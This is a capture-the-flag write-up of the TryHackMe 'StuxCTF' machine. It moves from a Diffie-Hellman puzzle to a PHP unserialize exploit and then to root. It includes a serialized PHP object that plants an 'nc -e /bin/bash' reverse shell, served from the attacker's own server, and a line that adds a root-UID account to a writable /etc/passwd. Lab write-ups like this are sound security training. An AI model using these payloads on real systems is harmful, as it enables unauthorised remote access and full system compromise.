---
title: StuxCTF 🧬
tags:
  - Linux
  - Python-Scripting
  - LFI
  - Decrypting
  - Crypto
---
![](Pasted%20image%2020240531202235.png)

> *Even though this is a "Medium" machine, I found it a bit hard*

I started performing an Nmap scan:

```shell
nmap -sC -T4 -p- 10.10.114.31 > sC.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 19:16 CEST
Nmap scan report for 10.10.114.31
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 e8:da:b7:0d:a7:a1:cc:8e:ac:4b:19:6d:25:2b:3e:77 (RSA)
|   256 c1:0c:5a:db:6c:d6:a3:15:96:85:21:e9:48:65:28:42 (ECDSA)
|_  256 0f:1a:6a:d1:bb:cb:a6:3e:bd:8f:99:8d:da:2f:30:86 (ED25519)
80/tcp open  http
| http-robots.txt: 1 disallowed entry 
|_/StuxCTF/
|_http-title: Default Page

Nmap done: 1 IP address (1 host up) scanned in 22.50 seconds
```

So I decided to take a look at the webpage:

![](Pasted%20image%2020240531202432.png)

As I found this, I took a look to the source code:

![](Pasted%20image%2020240531202503.png)

Here I found what it seemed to be some kind of variables to solve a problem.

Checking the hint on THM it seemed like [Diffie-Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)

![](Pasted%20image%2020240531202649.png)

So I created the following script:

```python
p=9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251
g=7
a=330
b=450
gc=6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617
gca=(gc**a)%p
gcab=(gca**b)%p

print(gcab)
print(str(gcab)[:128])
```

Which gave me this directory: `47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055`

So I searched for it:

![](Pasted%20image%2020240531202831.png)

As I didn't detect anything with [dirsearch 📁](/notes/Tools/dirsearch.md), I decided to look at the source code:

![](Pasted%20image%2020240531202937.png)

It gave me the hint `<!-- hint: /?file= -->`, so it seemed like some kind of LFI

I tried to fuzz it and didn't work, so I put the unique file that is detected by **dirsearch**, which is `index.php` and searched for it: `http://10.10.114.31/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/?file=index.php`

It printed some kind of hex code, which I decrypted using [Cyberchef](https://cyberchef.org/):

![](Pasted%20image%2020240531203241.png)

![](Pasted%20image%2020240531203322.png)

It was the script behind the `?file=`:

```html
<br />
error_reporting(0);<br />
class file {<br />
        public $file = "dump.txt";<br />
        public $data = "dump test";<br />
        function __destruct(){<br />
                file_put_contents($this->file, $this->data);<br />
        }<br />
}<br />
<br />
<br />
$file_name = $_GET['file'];<br />
if(isset($file_name) && !file_exists($file_name)){<br />
        echo "File no Exist!";<br />
}<br />
<br />
if($file_name=="index.php"){<br />
        $content = file_get_contents($file_name);<br />
        $tags = array("", "");<br />
        echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));<br />
}<br />
unserialize(file_get_contents($file_name));<br />
<br />
<!DOCTYPE html><br />
    <head><br />
        <title>StuxCTF</title><br />
	<meta charset="UTF-8"><br />
        <meta name="viewport" content="width=device-width, initial-scale=1"><br />
        <link rel="stylesheet" href="assets/css/bootstrap.min.css" /><br />
        <link rel="stylesheet" href="assets/css/style.css" /><br />
    </head><br />
        <body><br />
        <nav class="navbar navbar-default navbar-fixed-top"><br />
          <div class="container"><br />
            <div class="navbar-header"><br />
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"><br />
                <span class="sr-only">Toggle navigation</span><br />
              </button><br />
              <a class="navbar-brand" href="index.php">Home</a><br />
            </div><br />
          </div><br />
        </nav><br />
        <!-- hint: /?file= --><br />
        <div class="container"><br />
            <div class="jumbotron"><br />
				<center><br />
					<h1>Follow the white rabbit..</h1><br />
				</center><br />
            </div><br />
        </div>            <br />
        <script src="assets/js/jquery-1.11.3.min.js"></script><br />
        <script src="assets/js/bootstrap.min.js"></script><br />
    </body><br />
</html><br />
```

I analyzed it in search of some code vulnerability and I found that in `unserialize(file_get_contents($file_name));` the function `unserialize` let us to load any file on the Internet.
- I found [this documentation](https://notsosecure.com/remote-code-execution-php-unserialize) which explains more about this vulnerability

So, to gain RCE, I created the file `shell.php`:

```php
<?php
class file
{
 public $file = 'remote.php';
 public $data = '<?php shell_exec("nc -e /bin/bash YOUR_IP YOUR_PORT"); ?>';
}

echo (serialize(new file));

?>
```

Then I performed the following command:

```shell
php shell.php > shell.txt
```

After this I initialize a python server `python3 -m http.server 8090`

And then I search for my file (the `.txt` one) like: `view-source:10.10.114.31/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/?file=http://10.11.74.136:8090/shell.txt`

So once here, the file is uploaded and you can search it: `view-source:10.10.114.31/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/remote.php` 

> Take care of putting the name inside the php shell (in my case `remote.php`)

We've got a reverse shell:

![](Pasted%20image%2020240531204257.png)

And we found the user flag on the `/home/grecia` directory

![](Pasted%20image%2020240531204352.png)

I uploaded `linpeas` to scan for privilege escalation and found that the `/etc/passwd` was writable, so I did the following:

```
# On my machine
openssl passwd -1 -salt hacker hacker

# Then, on the /etc/passwd file I added at the end
hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
```

![](Pasted%20image%2020240531204719.png)

After this, I logged in as the user `hacker` and got root access.

Got the root flag:

![](Pasted%20image%2020240531204821.png)

==Machine pwned==